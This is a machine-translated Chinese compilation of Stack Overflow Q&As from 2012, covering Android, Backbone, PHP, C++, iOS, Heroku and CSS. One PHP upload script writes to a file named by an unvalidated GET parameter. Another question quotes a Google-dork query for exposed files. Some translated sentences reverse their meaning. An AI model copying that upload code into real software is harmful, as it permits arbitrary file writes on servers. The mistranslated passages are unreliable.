> 时间：2012-04-22T17:13:22.233
> 
> 标签：android, android-arrayadapter, android-view, commonsware

我一直在学习 Commonsware Android Programming Tutorials 和教程 5，额外得分 2，挑战是根据对象的“类型名称”（餐厅的“类型”属性）使用多个布局在 ListView 中显示行，这是一个字符串）。因此，它建议覆盖`getItemViewType`并`getViewTypeCount`在自定义 ArrayAdapter 中。此外，[android 文档](http://developer.android.com/reference/android/widget/ArrayAdapter.html)和其他[在线食谱](https://stackoverflow.com/questions/5300962/getviewtypecount-and-getitemviewtype-methods-of-arrayadapter)或[博客文章](http://android.amberfog.com/?p=296)也提出了相同的建议。

在这种情况下，遵循这个配方并覆盖这两种方法可以正常工作，但会导致基于检查该餐厅“类型”属性的值的冗余逻辑。例如（请注意，此适配器是一个内部类，并且`restaurants`是声明为外部 Activity 成员的 Restaurant 对象的 ArrayList）：

```
class RestaurantsAdapter extends ArrayAdapter<Restaurant> {

  private static final int ROW_TYPE_DELIVERY = 0;
  private static final int ROW_TYPE_TAKE_OUT = 1;
  private static final int ROW_TYPE_SIT_DOWN = 2;

  RestaurantsAdapter() {
    super(LunchListActivity.this, android.R.layout.simple_list_item_1, restaurants);
  }

  public int getViewTypeCount() {
    return 3;
  }

  public int getItemViewType(int position) {
    String type = restaurants.get(position).getType();
    if (type == "delivery") {
      return ROW_TYPE_DELIVERY;
    } else if (type == "take_out") {
      return ROW_TYPE_TAKE_OUT;
    } else {
      return ROW_TYPE_SIT_DOWN;
    }
  }

  // Sets the icon, name and address of the Restaurant for the view.
  public View getView(int position, View convertView, ViewGroup parent) {
    View row = convertView;
    RestaurantHolder viewHolder;

    if (row == null) {
      LayoutInflater inflater = getLayoutInflater();
      switch (getItemViewType(position)) {
        case ROW_TYPE_DELIVERY:
          row = inflater.inflate(R.layout.row_delivery, null);
          break;
        case ROW_TYPE_TAKE_OUT:
          row = inflater.inflate(R.layout.row_take_out, null);
          break;
        default:
          row = inflater.inflate(R.layout.row_sit_down, null);
          break;
      }

      viewHolder = new RestaurantHolder(row);
      row.setTag(viewHolder);
    } else {
      viewHolder = (RestaurantHolder)row.getTag();
    }

    viewHolder.populateFrom(restaurants.get(position));

    return row;
  }

} 
```

让我烦恼的是重复的逻辑（ if/else in`getItemViewType`和`switch`in `getView`）。因此，我将实现更改为以下内容：

```
class RestaurantsAdapter extends ArrayAdapter<Restaurant> {

  RestaurantsAdapter() {
    super(LunchListActivity.this, android.R.layout.simple_list_item_1, restaurants);
  }

  // Sets the icon, name and address of the Restaurant for the view.
  public View getView(int position, View convertView, ViewGroup parent) {
    View row = convertView;
    RestaurantHolder viewHolder;

    if (row == null) {
      LayoutInflater inflater = getLayoutInflater();
      if (restaurants.get(position).getType() == "delivery") {
        row = inflater.inflate(R.layout.row_delivery, null);
      } else if (restaurants.get(position).getType() == "take_out") {
        row = inflater.inflate(R.layout.row_take_out, null);
      } else {
        row = inflater.inflate(R.layout.row_sit_down, null);
      }
      viewHolder = new RestaurantHolder(row);
      row.setTag(viewHolder);
    } else {
      viewHolder = (RestaurantHolder)row.getTag();
    }

    viewHolder.populateFrom(restaurants.get(position));

    return row;
  }

} 
```

这实现了动态加载三个 xml 布局之一的目标，去除了冗余逻辑，略微减少了代码与布局数量的耦合，并且不需要覆盖`getViewTypeCount`和`getItemViewType`.

我的问题是：如果不需要，为什么要覆盖这两种方法？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-22T17:20:01.873

> 如果不需要，为什么要覆盖这两种方法？

添加几十家不同类型的餐厅，并在滚动时观察您的行回收是否出现问题，因为您的实现如上所示。

`getItemViewType()`并`getViewTypeCount()`确保行回收工作。Android 将维护单独的对象池，并且只会将正确类型的对象返回给您以进行回收。

在您的解决方案中，您可以充气一`R.layout.row_delivery`排，然后在您真正需要一排时将其交还给您进行回收`R.layout.row_sit_down`。

顺便说一句，不要`inflate(R.layout.row_take_out, null)`在`AdapterView`. 要使`RelativeLayout`规则正确处理，请使用`inflate(R.layout.row_take_out, parent, false)`.

# jquery - 带有 ASP.NET MVC / Backbone- AJAX 主页的单页应用程序

> ID：10270147
> 
> 赞同：0
> 
> 时间：2012-04-22T17:13:35.837
> 
> 标签：jquery, backbone.js, asp.net-mvc-4

我试图让我的应用程序在页面之间的导航方面完全 ajaxified（使用 Backbone.js 路由）。

所以我基本上做了我想做的一切，所有页面都正确加载，除了主页之外没有页面刷新。我隔离了为什么会发生这种情况，但我不知道如何修复它。对于以前使用过单页应用程序的任何人来说，这可能是一个非常简单的问题。

所以基本上我有这些主干路线：

```
 routes: {
        "": "renderHome",
        "!/:page": "renderPage"
    },
    renderHome: function () {
        pageView.render("Home");
    },
    renderPage: function (page) {
        pageView.render(page);
    } 
```

Backbone PageView 具有如下渲染方法：

```
 render: function (page) {
        $(this.el).load("Navigation/" + page);
 } 
```

基本上， /Navigation/anypage 通过 ajax 加载（不刷新），但 /Navigation/Home 会导致页面刷新。

但是，如果我简单地更改主页锚上的href FROM：

```
<a class="navigationTab" href=""><span>Home</span></a> 
```

到：

```
<a class="navigationTab" href="#!/Home"><span>Home</span></a> 
```

它按应有的方式工作。但是我不希望我的主页是 www.website.com/#!/Home 那太丑了！！

如何保持主页的原始格式（没有主题标签）并且仍然可以在不刷新页面的情况下加载它。

我怀疑这是因为将 window.location.hash 更改为空白值会使其重新加载页面，但如果有一个标签，它就像转到页面的不同部分，所以不需要重新加载。我怎样才能防止这种情况？

```
$('.navigationTab').click(function (event) {
    event.preventDefault();
    window.location.hash = $(this).attr('href');
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:40:09.583

基本上，主题标签所做的是将 url 设置为相同的 url，但在其中添加 #(page) ......您可以通过在最后手动访问的任何页面上添加哈希来尝试，页面不会刷新.

你有两个选择

### 选项一 - 使用 pushState

这是一个很长的故事，您可能需要修改整个网站和服务器结构，因为在使用 pushState 时您可能会删除所有主题标签。

### 选项二 - 用标签设置家

```
<a class="navigationTab" href="/#"><span>Home</span></a> 
```

通过这样做，您会将路由器设置为 Home，但最后会有一个标签

# objective-c - 在 NSString 搜索栏中不断搜索子字符串

> ID：10270148
> 
> 赞同：0
> 
> 时间：2012-04-22T17:13:41.000
> 
> 标签：objective-c, ios, xcode, search

我有一个包含多个 NSString 元素的数组，还有一个视图，其中有一个搜索栏。我想开始搜索用户在搜索字段中写入的内容作为每个 NSString 元素的子字符串。如果 NSString 元素包含子字符串，我想将其添加到新数组中。我试图用代码来做到这一点，它工作正常，但它不断添加对象，即使它已经为它们添加了，所以有人知道为什么吗？我已经将委托设置为自我。

//.h @接口类1

```
@property(strong, nonatomic) NSMutableArray *allExercisesNames;
@property (weak, nonatomic) IBOutlet UISearchBar *searchBar;
@property(strong, nonatomic) NSMutableArray *foo;

@end 
```

//.m

```
@implementation class1

-(void)searchBar:(UISearchBar *)searchBar textDidChange:(NSString *)searchText
{    
for(int i = 0; i < _allExercisesNames.count;i++)
{
    if([[_allExercisesNames objectAtIndex:i] rangeOfString:searchBar.text].location != NSNotFound)
    {
        if(_foo == nil)
        {
            _foo = [[NSMutableArray alloc]initWithObjects:[_allExercisesNames objectAtIndex:i], nil];
            [self.gridView reloadData];

        }
        else 
        {
            [_foo addObject:[_allExercisesNames objectAtIndex:i]];
            [self.gridView reloadData];
        }
    }

}

if([searchBar.text isEqualToString:@""] || searchBar.text==nil)
    //![_allExercisesNames containsObject:searchBar.text
{
    _foo = nil;
    [self.gridView reloadData];
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:30:16.393

您没有在函数顶部将“nil”分配给 _foo，因此每次键入内容时它都会继续添加到旧的 _foo 数组中。

相反，您应该将 _foo 设置为函数顶部的新数组，以便在扫描 _allExercisesNames 数组之前将其清除。

这是一个固定的简化版本，它还使用了“for (x in y)”来使其更简洁。

```
-(void)searchBar:(UISearchBar *)searchBar textDidChange:(NSString *)searchText
{
    if([searchBar.text isEqualToString:@""] || searchBar.text==nil)
        _foo = nil;
    else
    {
        _foo = [NSMutableArray new];
        for(NSString *exercise in _allExercisesNames)
            if([exercise rangeOfString:searchBar.text].location != NSNotFound)
                [_foo addObject:exercise];
    }

    [self.gridView reloadData];
} 
```

# java - 如何获得点击的特定 Jbutton？

> ID：10270151
> 
> 赞同：1
> 
> 时间：2012-04-22T17:14:22.207
> 
> 标签：java, swing

我有一个我正在为其制作 Jbuttons 的标题列表。我希望当我点击一个特定的按钮时，我会得到那个文本。我在网上搜索并尝试了一些东西，但它们给出了列表中的随机标题，而不是我点击的标题。请让我知道我在哪里犯错。任何形式的帮助将不胜感激。谢谢，

```
 for(String title:listOfTitles){
           button1.setText(title);
           button1.setBounds(20,50,100,25);
           button1.setBorderPainted(true);
           button1.setFocusPainted(true);
           button1.setContentAreaFilled(false);
           button1.setOpaque(false);
           button1.setBackground(Color.lightGray);
           button1.setBounds(5,i,100,100);
           button1.addMouseListener(new java.awt.event.MouseAdapter() {
                public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextField3.setText(((button1) evt.getSource()).getText());
            }

         });
         jPanel3.add(button1);
         jPanel3.revalidate();
         jPanel3.repaint();
         i = i+15;
     } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T17:15:53.243

通常，您不想将 MouseListener 添加到 JButtons。如果您已经阅读过按钮教程，那么您肯定已经看到应该使用 ActionListeners。如果这样做，请调用`getActionCommand()`传递给侦听器`actionPerformed(...)`方法的 ActionEvent 对象，您将获得所需的字符串。

IE，

```
myButton.addActionListener(new ActionListener() {
   actionPerformed(ActionEvent evt) {
      System.out.println("Button's actionCommand: " + evt.getActionCommand());
   }
}); 
```

法律免责声明：此代码未经编译或测试，并非用于复制和粘贴解决方案，而是为了让您了解 ActionListeners 的工作原理，以便您可以将该概念应用于您的程序。

此外，请查看[Swing JButton 教程](http://docs.oracle.com/javase/tutorial/uiswing/components/button.html)以了解您需要了解的所有其他详细信息。

# php - 会话变量不显示

> ID：10270155
> 
> 赞同：0
> 
> 时间：2012-04-22T17:14:43.187
> 
> 标签：php, session, variables

所以我在一个页面上创建一个会话并创建一个名为 uName 的新变量并分配一个值。我转到另一个页面并尝试回显该值，但出现错误：“未定义变量_SESSION”

这是代码：

我开始会话并创建变量 uName 的页面

```
<?php 
    session_start();
    $_SESSION['uName'] = "Mike";
?> 
```

我尝试回显变量值的页面：

```
<?php echo "My Name is " . $_SESSION['uName'];?> 
```

我的代码中除了一个页面的外壳之外没有其他任何东西，只有 html、head、title、body 和段落标签，所有这些标签都正确嵌套。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-22T17:15:52.313

您需要在新文件的开头再次调用 session_start() ，如下所示：

```
<?php 
session_start();

echo "My Name is " . $_SESSION['uName']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:01:12.840

您需要添加 session_start(); 到所有使用会话的文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T19:31:46.893

page1.php

```
<?php
session_start();
$_SESSION['uName'] = "Mike";
?> 
```

page2.php

```
<?php
session_start();
echo "My Name is " . $_SESSION['uName'];
//eventually
unset($_SESSION['uName']);
?> 
```

# php - 有人可以从我的服务器外部访问我的数据库吗？

> ID：10270159
> 
> 赞同：1
> 
> 时间：2012-04-22T17:14:50.177
> 
> 标签：php, database, security

我试图“[谷歌破解](http://en.wikipedia.org/wiki/Google_hacking)”我的网站以查看发生了什么（我最近读到了它），我用谷歌搜索了`site:www.x.com intitle:"index of" "server at" + db`.

并在三个目录下找到了一个`.inc`文件。

```
<?php 
    class clsSettings
    { 
        var $site   = "localhost"; 
        var $sitedb = "x"; 
        var $siteuser = "x"; 
        var $sitepass     = "x";
    } /* settings */
?> 
```

有人可以从我的服务器外部访问我的数据库吗？

我应该担心这种敏感信息暴露吗？

注意：我用 s 删除了敏感信息`X`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:19:14.370

这就是为什么您不将 PHP 文件命名为`.php`. 如果需要，您*可以*将服务器配置为解析`.inc`文件或任何文件扩展名，如 PHP，但这不是常见的配置，尤其是在共享服务器上。

如果您可以看到包含密码的文件内容，那么世界其他地方也可以。此外，Aziz 关于更改 robots.txt 的评论根本对您**没有**帮助。事实上，您可以通过这种方式提醒您注意隐藏的内容，因为任何试图进入您网站的人都不会遵守 robots.txt 中的规则。

不允许自动目录索引也很常见，除非您出于某种特定原因需要它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:23:21.577

我相信您通过将文件扩展名重命名为 .php 解决了这个问题。

在您的服务器上使用新密码执行此命令（即通过 SSH）：

```
mysqladmin -u root -p 'oldpassword' password newpass 
```

然后更改所有引用的 PHP 文件的密码。

此外，您可能想要创建一个“机器人陷阱”来阻止不遵循您的 robots.txt 文件的机器人，请参阅[http://www.fleiner.com/bots/#trap](http://www.fleiner.com/bots/#trap "http://www.fleiner.com/bots/#trap")了解更多信息。但是请注意，这是一个弱保护措施。

您也可以将其添加到 WWW 根目录中的 .htaccess 以停止目录列表：

```
Options -Indexes 
```

# php - 读取巨大的文本文件并将每一行存储在数据库中

> ID：10270162
> 
> 赞同：0
> 
> 时间：2012-04-22T17:15:13.027
> 
> 标签：php, mysql

我编写了一个 PHP 脚本，它通过一个文本文件（实际上它是来自 imdb 的“列表”文件）运行并将其存储在我的本地 MySQL 数据库中。

```
public static function updateMovies( $list ) {
    $offset = 15;               // movies.list start with movie names at line 16
    $handle = fopen($list, "r") or die("Couldn't get handle");
    if ($handle) {
        while (!feof($handle)) {
            $buffer = fgets($handle);
            if($offset!=0)
                $offset--;
            else
                if($buffer[0] != '"'){
                    $title = trim( substr( $buffer, 0, strpos( $buffer, '(' ) ) );
                    $year = intval(trim( substr( $buffer, strpos( $buffer,'(' )+1, 4 ) ));
                    Movie::create( $title, $year );
                }
        }
        fclose($handle);
    }
} 
```

由于这些列表文件高达 200MB，因此需要很长时间。默认情况下，PHP`MAX_EXECUTION_TIME`设置为 30 秒。

我将此值设置为 300 只是为了尝试它是否有效。例如，我的“movies.list”文件大约 80MB，使用此脚本 300 秒在我的数据库中创建了大约 25000 行。这不起作用，因为我什至没有看过以“B”开头的电影。

我知道我可以将其设置`MAX_EXECUTION_TIME`为 0（无限制），但将来我不希望该数据库位于我的本地主机上。`MAX_EXECUTION_TIME`我希望它在我的网络服务器上，据我所知，我的网络服务器主机设置为 90。

任何想法你会如何处理这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:18:28.770

您可以：使用[set_time_limit(sec)](http://php.net/manual/en/function.set-time-limit.php)或（更好）通过 cron 条目[从命令行](http://php.net/manual/en/features.commandline.php) 运行您的脚本。这样，您将避免许多其他与 php 无关的超时问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T19:53:08.627

我认为将这种大文件直接加载到数据库中并不是一个好主意……尤其是当需要很长时间才能得出结论时

**我的建议**

在本地将文件拆分为较小的块..然后在远程服务器上将其上传到您的数据库

示例（文档： [http](http://en.wikipedia.org/wiki/Split_%28Unix%29) ://en.wikipedia.org/wiki/Split_%28Unix%29 ）

```
 exec('split -d -b 2048m ' . $list . ' chunks'); 
```

对于纯 PHP 实现，请参见

[http://www.php.happycodings.com/File_Manipulation/code50.html](http://www.php.happycodings.com/File_Manipulation/code50.html)

或者

```
define('CHUNK_SIZE', 1024*1024);
function readfile_chunked($filename, $retbytes = TRUE) {
    $buffer = '';
    $cnt =0;
    // $handle = fopen($filename, 'rb');
    $handle = fopen($filename, 'rb');
    if ($handle === false) {
      return false;
    }
    while (!feof($handle)) {
      $buffer = fread($handle, CHUNK_SIZE);
      echo $buffer;
      ob_flush();
      flush();
      if ($retbytes) {
        $cnt += strlen($buffer);
      }
    }
    $status = fclose($handle);
    if ($retbytes && $status) {
      return $cnt; // return num. bytes delivered like readfile() does.
    }
    return $status;
  } 
```

# objective-c - 任务终止后接收数据？

> ID：10270170
> 
> 赞同：1
> 
> 时间：2012-04-22T17:16:05.803
> 
> 标签：objective-c, cocoa, notifications, nstask, nspipe

我正在使用`NSTask`and`NSPipe`执行命令并异步获取其输出。

[我使用的代码与我的问题](https://stackoverflow.com/questions/9965360/async-execution-of-shell-command-not-working-properly)几乎 100% 相同（包括修复程序）。

但是，当我测试它时，我注意到**有时**，`NSTaskDidTerminateNotification`在最后一个`NSFileHandleReadCompletionNotification`.

换句话说，看似已死的任务是在终止后向我发送数据。

怎么了？有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T09:02:35.617

正如@ughoavgfhw 提到的：事实证明确实**没有问题**。

# scala - 推送到 Heroku 后应用程序未启动

> ID：10270174
> 
> 赞同：7
> 
> 时间：2012-04-22T17:16:32.093
> 
> 标签：scala, heroku

这是我的“git push heroku master”命令的输出：

```
 [info] Done updating.
   [info] Compiling 2 Scala sources to /tmp/build_3kg6a8iex5xd6/target/scala-2.8.1/classes...
   [success] Total time: 8 s, completed Apr 22, 2012 4:54:01 PM
   [info] Wrote start script for mainClass := Some(JettyLauncher) to /tmp/build_3kg6a8iex5xd6/target/start
   [success] Total time: 0 s, completed Apr 22, 2012 4:54:01 PM
   Discovering process types
   Procfile declares types -> web
   Compiled slug size is 57.0MB
   Launching...  done, v23
   http://xxxxxx.herokuapp.com deployed to Heroku 
```

在此之后，应用程序仍未启动。试过heroku ps。它没有显示任何过程。

我的 Procfile 的内容：

```
web: target/start JettyLauncher 
```

当我尝试工头启动时，它工作正常。

有人可以帮我找出为什么应用程序在部署到 Heroku 后没有启动吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-22T18:55:53.700

尝试运行

```
heroku scale web=1 
```

如果您在此 heroku 之前推送失败，则不一定会自动启动应用程序

# c++ - 使用友元运算符的编译器错误<<

> ID：10270176
> 
> 赞同：1
> 
> 时间：2012-04-22T17:16:36.633
> 
> 标签：c++, compiler-errors, operators, operator-overloading

我正在尝试为我的班级使用 operator<<。这是代码：

课堂定义：

```
friend std::ostream& operator<<(std::ostream& out, const longint& num); 
```

类外定义：

```
std::ostream& operator<<(std::ostream& out, const longint& num_) {
    if (num_.negative())
        out << '-';
    longint::const_iterator it = num_.array.end();
    --it;
    longint::const_iterator finish = num_.array.begin();
    --finish;
    while (it != finish) {
        out << num_.digtochar(*it);
        --it;
    }
} 
```

`longint::negative`是公开的，`longint::array`也是`longint::digtochar`私有的。在很多谷歌搜索的例子中，我可以看到私人成员可以在朋友运算符中使用，但我给出了错误：

```
../long_arithm.h:57:20: error: «std::list<signed char> long_arithm::longint::array» is private
../long_arithm.cpp:94:36: error: in this context
../long_arithm.h:57:20: error: «std::list<signed char> long_arithm::longint::array» is private
../long_arithm.cpp:96:40: error: in this context
../long_arithm.h:44:9: error: «long_arithm::schar long_arithm::longint::digtochar(long_arithm::schar) const» is protected
../long_arithm.cpp:99:28: error: in this context 
```

为什么？我做错了什么？

**UPD。**最小代码：

```
// long_arithm.h
#ifndef LONG_ARITHM_H_
#define LONG_ARITHM_H_

#include <iostream>
#include <list>

namespace long_arithm {

    typedef signed char schar;

    class longint {
    public:
        typedef std::list<schar>::const_iterator const_iterator;

        inline bool negative() const { return minusSign; }

        friend std::ostream& operator<<(std::ostream& out, const longint& num);

        enum { error_char = 127 };

    protected:
        schar digtochar(schar num) const;

    private:
        bool minusSign;
        std::list<schar> array;
    };
};

// long_arithm.cpp
#include "long_arithm.h"
#include <iostream>

using namespace long_arithm;

schar longint::digtochar(schar num) const {
    switch (num) {
        case 0: return '0';
        case 1: return '1';
        case 2: return '2';
        case 3: return '3';
        case 4: return '4';
        case 5: return '5';
        case 6: return '6';
        case 7: return '7';
        case 8: return '8';
        case 9: return '9';
        default: return error_char;
    }
}

std::ostream& operator<<(std::ostream& out, const longint& num_) {
    if (num_.negative())
        out << '-';
    longint::const_iterator it = num_.array.end();
    --it;
    longint::const_iterator finish = num_.array.begin();
    --finish;
    while (it != finish) {
        out << num_.digtochar(*it);
        --it;
    }
    return out;
} 
```

谢谢你的回答。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T17:32:18.370

您的`friend`声明在命名空间内，但函数的定义不在。因此它们不匹配，并且没有激活朋友特权。

在命名空间内移动定义，例如

```
namespace long_arithm
{
    std::ostream& operator<<(std::ostream& out, const longint& num_)
    {
        if (num_.negative())
            out << '-';
        longint::const_iterator it = num_.array.end();
        --it;
        longint::const_iterator finish = num_.array.begin();
        --finish;
        while (it != finish) {
            out << num_.digtochar(*it);
            --it;
        }
        return out;
    }
} 
```

它应该开始工作。

# c++ - 从以不同方式格式化的文件数据中读取。C++

> ID：10270183
> 
> 赞同：2
> 
> 时间：2012-04-22T17:18:54.167
> 
> 标签：c++, input, io, file-io, formatted-input

我有一个文本文件，其中存储了一些数据。有几个数据块以不同的方式格式化，所以我需要我的程序能够判断一个块何时结束，另一个块何时开始。这是一个非常简单的例子。

文本文件：

```
a 1
b 2
c 3

qwerty
asdfgh
xcvbnm 
```

我的程序：

```
int x;
char a;
string line;

while(ifs >> a >> x)
    cout << a << " " << x << "\n";

cout<<"\n" << "next block of data" << "\n";

while(ifs >> line)
    cout << line; 
```

但是它没有读取下半部分。我认为使用 >> 格式化读取只会丢弃空格，所以我认为在第一个 while() 失败后，第二个 while() 应该开始读取后半部分。这是我的输出：

```
a 1
b 2
c 3

next block of data 
```

另外，如果有人可以推荐一些关于此的内容，我将不胜感激。我搜索了几本书和互联网，找不到任何关于 >> 运算符如何工作的清晰手册。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:30:31.183

失败时`operator>>`，设置失败位，并且所有后续提取也将失败，除非您清除错误标志。利用`ios::clear()`

```
while(ifs >> a >> x)
    cout << a << " " << x << "\n";

ifs.clear(); 
```

您可以使用`ios::bad()`,`ios::fail()`和`ios::eof()`来确定提取失败的原因，以便您采取相应措施。

# iphone - 给定 iPhone UDID 的私人 iPhone 应用程序分发？

> ID：10270184
> 
> 赞同：3
> 
> 时间：2012-04-22T17:18:59.750
> 
> 标签：iphone, ios

我正在开发一款 iPhone 游戏，有人对演示感兴趣。

他给了我他的 iPhone UDID，但我不确定如何处理它。他究竟是如何期望我给他一个我的项目的演示？我当然不能将它上传到应用商店，因为它不完整，我希望它保持私密。

那么，给定一个 UID，您将如何分发您的应用程序？我认为有一些方法可以编译一个.ipa或其他东西并将其发送给他，不知道他将如何安装它......

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T17:25:50.173

如果您购买了苹果开发者帐户，您要做的就是为该设备制作[配置文件并下载它，现在您可以将该应用程序作为存档发送以对其进行测试。](https://stackoverflow.com/q/368062/593709)

有很多服务可用，我建议你使用[testflight](https://testflightapp.com/dashboard/)

这是在真实设备上进行测试[的有用讨论](https://stackoverflow.com/q/40154/593709)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-22T17:32:10.667

您需要一个付费的 iPhone 开发者帐户，费用为 99 美元。要将应用程序发送给某人，而不是通过 USB 直接从 Xcode 构建到设备，您需要使用分发配置文件。苹果开发者网站有很好的指导指导你完成获取和设置 Xcode。一旦您可以存档构建，请按照以下链接中的答案中的说明创建 ipa 文件。一旦您使用您的分发配置文件构建了一个 ipa 文件，您就可以通过电子邮件将其发送给您的 beta 测试人员（或将其发布在网站上），他们将能够访问它。

[Xcode 4：创建 IPA 文件而不是 .xcarchive](https://stackoverflow.com/questions/5265292/xcode-4-create-ipa-file-instead-of-xcarchive)

[TestFlight](https://testflightapp.com/)也非常有助于做到这一点，并提供了许多其他很棒的功能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T07:57:27.813

很简单的步骤：

1.  在 Apple 开发者门户中注册您需要演示的设备 UDID。
2.  先决条件 - 您需要注册此开发许可证，费用为 99 美元
3.  一旦您注册了设备。创建两
    件事 配置文件
    b. 证书

一旦你准备好这两件事，你可以在你的 IDE 中提供它们来构建 ipa 文件，该文件是临时的，并且只能在注册的设备上安装/运行

# webserver - 有人在生产中使用过 GWAN Web 服务器吗？

> ID：10270185
> 
> 赞同：10
> 
> 时间：2012-04-22T17:19:10.157
> 
> 标签：webserver, g-wan

我最近遇到了 gwan ( [http://gwan.ch](http://gwan.ch) ) 一个免费的网络服务器，根据许多人的说法，它的速度似乎非常快。我对基于 C 的脚本不是很感兴趣，但我想用它来提供静态内容。我确实在 ./ 中看到了一个关于使用 gwan 的线程

[http://tech.slashdot.org/story/09/11/29/2133243/g-wan-another-free-web-server](http://tech.slashdot.org/story/09/11/29/2133243/g-wan-another-free-web-server)

有人在生产中运行 gwan 有实际经验吗？任何最佳做法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-17T16:43:48.057

> 我对基于 C 的脚本不是很热衷

G-WAN 提供`Java`, `Scala`, `PH7`, `Go`, `Perl`, `Python`, `Ruby`, `C++`, `C#`,`D`和`Objective-C`（不仅是 C 语言）中的脚本。

> 有人在生产中运行 gwan 有实际经验吗？

我们这样做（我是 G-WAN 团队的一员），但 3 年多来，我们已经注册（和未注册）用户向我们咨询如何更好地调整 G-WAN 以满足他们的需求，或如何开发G-WAN 脚本或处理程序。

它们的范围从“旧的”传统业务（如`accounting`（服务提供商））或`yellow-pages`尖端的 Web 应用程序（如`trading`或`online-games`.

最近有一种新的兴趣让 G-WAN 参与到大型分布式数据库中——G-WAN 就是为此而创建的（因为我们将它用于[Global-WAN](http://Global-WAN.com/)）。

> 任何最佳做法？

这是一个过于宽泛的问题，无法用几行来回答。

不要试图复制您在其他服务器上所做的事情：通常有一种更简单的方法可以使用 G-WAN 做事（例如[此处发布](http://gwan.com/developers#handler)的 FLV 和重写处理程序示例）。

尽量保持简单。尊重这条规则，你总是会赢。

# php - “php://input”的 Ruby 等价物是什么？

> ID：10270190
> 
> 赞同：0
> 
> 时间：2012-04-22T17:19:30.080
> 
> 标签：php, ruby, silverlight

我创建了一个非常简单的 PHP 文件，它完成了非常简单的工作，它将图像从 Silverlight OutOfBrowser 应用程序流式传输到服务器，它在`$_GET`和`$_POST`变量之间混合，事实上这是我非常简单的代码，我知道它缺乏安全，但我还是写了它只是为了确保我可以通过网络写入文件，并且它可以 100% 地上传多个文件等。

```
<?php
 //Gets 
  $myFile = $_GET['FileName'] ? $_GET['FileName'] : "input_stream.txt";
  $openedFile = fopen($myFile, 'w') or die("can't open file");  
  $input = file_get_contents("php://input");            
  fwrite($openedFile, $input);
  fclose($openedFile);

  //Check the mime type of the file (WRONG WAY)
  $mimeType = mime_content_type($myFile);   
  $input = null;    
  $finfo = finfo_open(FILEINFO_MIME_TYPE); 
  $mimeType = finfo_file($finfo, $myFile);
  echo $myFile . 'was uploaded, mime type : ' . $mimeType;
?> 
```

那么是否有任何简单的 Ruby 替代方法来获取原始 POST 数据（这将是 Silverlight 的 ByteArray）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:03:30.183

您可能希望使用 gem 进行 http 访问。这是一个：

[https://github.com/jnunemaker/httparty](https://github.com/jnunemaker/httparty)

这个例子看起来像你需要的：

[https://github.com/jnunemaker/httparty/blob/master/examples/basic.rb](https://github.com/jnunemaker/httparty/blob/master/examples/basic.rb)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T17:18:22.407

如果你在 Rails 3 上，request.raw_post() 就是你要找的。见[http://api.rubyonrails.org/classes/ActionDispatch/Request.html#method-i-raw_post](http://api.rubyonrails.org/classes/ActionDispatch/Request.html#method-i-raw_post)

# html - 条件 CSS 和媒体查询

> ID：10270192
> 
> 赞同：3
> 
> 时间：2012-04-22T17:19:57.877
> 
> 标签：html, css, media-queries

```
<link type="text/css" rel="stylesheet" media="only screen and (max-device-width: 480px)" href="/assets/css/phone.css" />
    <link type="text/css" rel="stylesheet" media="only screen and (min-device-width: 768px)" href="/assets/css/tablet.css" /> 
```

上面是我的条件 CSS，它为手机加载一个样式表，为平板电脑加载另一个样式表，但是在计算机上查看时如何让它使用平板电脑样式表？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T17:23:09.333

只是一个明显的答案，真的，但媒体查询是*唯一*限制该样式表在平板电脑上使用的东西。

删除该媒体查询将打开它以供在桌面（和任何其他适用的设备）上使用，同时牢记 CSS 特异性的通常规则；后面声明的样式会覆盖前面声明的样式；因此，如果您*希望*平板电脑样式覆盖普通桌面 CSS 文件，您确实必须稍后在文档中声明它/导入它/链接它。仍然在`head`，我想，但是在你想要覆盖的其他人之后。

还值得记住的是，当然对于智能手机，但我不确定平板电脑，它们可能具有自定义 GUI 元素，其中包括表单元素。因此，从台式机到平板电脑的转换（即使是出于开发目的）可能不像您或我们希望的那样无缝。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T18:53:48.800

您拥有的代码应该*已经*非常适用于台式机，因为媒体查询“（min-device-width：768px）”是宽度大于768px的*所有东西*：平板电脑，台式机，撒谎的设备等。（当然，那是假设浏览器完全支持媒体查询，这可能比你希望的更频繁。）

也就是说，我看到了四个可能的问题：
首先，一些手机将自己置于“手持”类别而不是“屏幕”类别，因此“仅屏幕......”将不匹配，并且根本不会向设备发送 CSS . 一种可能的解决方案是指定“仅所有...”。（这也回避了根本没有任何 CSS 用于打印的问题。）

其次，为了获得最佳性能，您可能希望将所有 CSS 和媒体查询放在一个文件中（使用 @media ...[query]... { CSS statements; } 块）而不是在 HTML 语句上指定媒体查询等多个 CSS 文件。每个 CSS 文件——包括那些被媒体查询禁用的文件——都会被下载；这可能需要大量的网络带宽。

第三，对于根本不会被分类的不可避免的设备没有“后备”。大多数情况下，每个网页都应该包含一个 CSS 块或一个 <link... 语句，没有媒体查询来提供默认/备用 CSS，然后其他 CSS 应该构建在该 CSS 之上或覆盖它。

